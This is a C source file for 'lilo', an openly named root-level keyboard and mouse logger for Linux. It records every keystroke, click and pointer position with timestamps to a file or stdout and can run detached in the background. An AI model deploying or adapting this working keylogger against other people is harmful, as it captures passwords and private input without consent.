/*
 * lilo - minimal mouse and keyboard logger for linux
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <linux/input.h>
#include <signal.h>
#include <sys/stat.h>
#include <assert.h>
#include <sys/poll.h>
#include <X11/Xlib.h>

/* unknown keystroke */
#define UK "UNKNOWN"

#define MOUSE "/dev/input/by-path/pci-0000:00:15.1-platform-i2c_designware.1-event-mouse"
#define KEYBOARD "/dev/input/by-path/platform-i8042-serio-0-event-kbd"

/*
 * normal keyboard keystrokes
 */
const int letters[] = {
	0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
	1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1,
	1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1,
	1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1,
	1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 1, 0, 0,
	0, 1, 0, 0, 0, 0, 0, -1,-1, -1,
	0, 0, -1, -1, -1, -1, -1, -1, -1, 0, 0, 1, 
	0, 0, -1, 0, 0, 0, 0, 0, 0, 
	0, 0, 0, 0, -1, -1, -1, -1, -1, -1, -1, 
	0
};

/*
 * normal keyboard keystrokes
 */
const char *keycodes[] = {
	"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
	"o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
	"j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
	"n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
	"F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
	"SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL_5",
	"NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
	"F11", "F12", UK, UK, UK, UK, UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
	"PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
	"DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
	"PAUSE"
};

/*
 * keyboard keystrokes when the right or left Shift key is pressed
 */
const char *shifted_keycodes[] = {
	"RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", 
	"_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", 
	"O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H", 
	"J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B", 
	"N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
	"F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", 
	"SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5", 
	"R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK, 
	"F11", "F12", UK, UK, UK, UK, UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
	"PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
	"DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
	"PAUSE"
};

void terminate() {
	
	printf("\nKeylogger terminated.\n");
  	exit(EXIT_SUCCESS);
	
}

void signal_handler(int signo) {

	if(signo == SIGINT) terminate();
	
	return;
  
}

/*
 * returns true when the keycode is a Shift (left or right)
 */
bool is_shift(int code) {

	return ((code == KEY_LEFTSHIFT) || (code == KEY_RIGHTSHIFT));

}

/*
 * returns true when the keycode is Esc
 */
bool is_esc(int code) {

	return (code == KEY_ESC);

}

/*
 * checks if the user has root privileges
 */
bool is_user_root(void) {

	if (geteuid() != 0) {
		printf("\nMust run it as root, in order to have access "
			"to the keyboard and mouse devices\n");
		return false;
	}

	return true;	

}
 
/*
 * prints the usage message
 */
void usage(void) {

	printf(
	    "\n"
	    "Usage:\n"
	    "     sudo ./keyloger [ -s | -f file] [-h] [-d]\n"
	    "\n"
	    "Options:\n"
	    "  -f    file    Print to output file.\n"
	    "  -s            Print to stdout.\n"
		"  -d            Daemonize.\n"
	    "  -h            This help message.\n"
	);

}

/*
 * the logger's core functionality
 * takes as arguments the mouse and keyboard file descriptor
 * you can add more arguments if needed
 */
void logger(int mouse, int keyboard, FILE *outstream) {

	struct pollfd fds[2];
	Display *display = NULL;
  	Window root = 0;
	Window child = 0;
  	int rootX = 0; 
	int rootY = 0; 
	int winX = 0;
	int winY = 0;
  	unsigned int mask = 0;
	struct input_event event;
	int event_size = sizeof(struct input_event);
	int shifted = 0;
	int previous_event_was_keyboard = 0;

	fds[0].fd = mouse;
	fds[0].events = POLLIN;
	fds[1].fd = keyboard;
	fds[1].events = POLLIN;

	display = XOpenDisplay(NULL);
  	XQueryPointer(display, DefaultRootWindow(display), &root, &child, &rootX, &rootY, &winX, &winY, &mask);
	
	if(signal(SIGINT, signal_handler) == SIG_ERR) printf("\nCan't catch signal SIGINT\n");
	
	while (1) {

		if (poll(fds, 2, -1) == -1) {
			exit(EXIT_FAILURE);
		}

		if ((fds[0].revents & POLLIN) == POLLIN) {

			// mouse
			if(read(mouse, &event, event_size) == -1) {
				exit(EXIT_FAILURE);
			}

			if (previous_event_was_keyboard) {
				fprintf(outstream, "\n");
			}

			if (event.type == EV_ABS) {

				XQueryPointer(display, DefaultRootWindow(display), &root, &child, &rootX, &rootY, &winX, &winY, &mask);
				
				fprintf(outstream, "mouse:%ld,%ld:%d,%d\n", event.time.tv_sec, event.time.tv_usec, rootX, rootY);

			} else if(event.type == EV_KEY  && event.value == 1) {

				if(event.code == BTN_LEFT) {
					fprintf(outstream, "mouse click:%ld,%ld:left\n", event.time.tv_sec, event.time.tv_usec);
				} else if(event.code == BTN_RIGHT) {
					fprintf(outstream, "mouse click:%ld,%ld:right\n", event.time.tv_sec, event.time.tv_usec);
				} else if(event.code == BTN_TOOL_FINGER || event.code == BTN_TOUCH) {
					// ignore
				} else {
					fprintf(outstream, "unknown mouse click:%ld,%ld:%x\n", event.time.tv_sec, event.time.tv_usec, event.code);
				}

			}

			previous_event_was_keyboard = 0;

		}

		if((fds[1].revents & POLLIN) == POLLIN) {

			// keyboard
			if(read(keyboard, &event, event_size) == -1) {
				exit(EXIT_FAILURE);
			}

			if(event.type == EV_KEY && event.value == 0) {

				if(is_shift(event.code)) shifted = 0;

			}

			if(event.type == EV_KEY && event.value == 1) {

				if(is_esc(event.code)) terminate();

				if(is_shift(event.code)) shifted = 1;

				if(letters[event.code] == 1) {

					if(!previous_event_was_keyboard) {
						fprintf(outstream, "keyboard:%ld,%ld:", event.time.tv_sec, event.time.tv_usec);
					}

					if(shifted) {
						fprintf(outstream, "%s", shifted_keycodes[event.code]);
					} else {
						fprintf(outstream, "%s", keycodes[event.code]);
					}

					previous_event_was_keyboard = 1;

				} else {

					if (previous_event_was_keyboard) {
						fprintf(outstream, "\n");
					}

					fprintf(outstream, "keyboard special:%ld,%ld:%s\n", event.time.tv_sec, event.time.tv_usec, keycodes[event.code]);

					previous_event_was_keyboard = 0;

				}

			}

		}

		fflush(outstream);

	}

	return;

}

/* this may be used if you want to start the program in the background */
void daemonize() {

	pid_t pid = 0;
	pid_t sid = 0;
	
	pid = fork();
	if (pid < 0) {
		printf("Fork failed!\n");
		exit(EXIT_FAILURE);
	} else if(pid > 0) {
		printf("Keylogger is running in the background, pid : %d\n", pid);
		exit(EXIT_SUCCESS);
	}
	sid = setsid();
	if (sid < 0) {
		printf("Session change failed!\n");
		exit(EXIT_FAILURE);
	}
	umask(0);
    
    return;

}

int file_exists(char *filename){

    FILE *file;
    if ((file = fopen(filename, "r"))){
        fclose(file);
        return 1;
    }

    return 0;

}

/*
 * main
 */
int main(int argc, char *argv[]) {

	int kb = 0;
	int ms = 0;
	int to_stdout = 0;
	int opt = 0;
	char *output = NULL;
	FILE *outstream = NULL;
	int should_daemonize = 0;
	int should_newline = 0;

	/* check root */
	if (!is_user_root()) {
		usage();
		exit(EXIT_FAILURE);
	}

	/* get options */
	while((opt = getopt(argc, argv, "f:shd")) != -1) {
		switch (opt) {
			case 'f':
				output = strdup(optarg);
				break;
			case 's':
				to_stdout = 1;
				break;
			case 'd':
				should_daemonize = 1;
				break;
			case 'h':
			default:
				usage();
				exit(EXIT_SUCCESS);
		}
	}
	
	if(to_stdout == 0 && output == NULL) {
		usage();
		exit(EXIT_FAILURE);
	}
	
	/* continue the process on background */
	if(should_daemonize) daemonize();

	if(to_stdout) {
		outstream = stdout;
	} else {
		if(file_exists(output)) should_newline = 1;
		outstream = fopen(output, "a+");
	}

	/* mouse file descriptor */
	if ((ms = open(MOUSE, O_RDONLY)) < 0) {
		printf("\nUnable to read from the device: mouse\n");
		exit(EXIT_FAILURE);
	}

	/* keyboard file descriptor */
	if ((kb = open(KEYBOARD, O_RDONLY)) < 0) {
		printf("\nUnable to read from the device: keyboard\n");
		exit(EXIT_FAILURE);
	}

	if(should_newline) fprintf(outstream, "\n");

	logger(ms, kb, outstream);

	assert(0);

}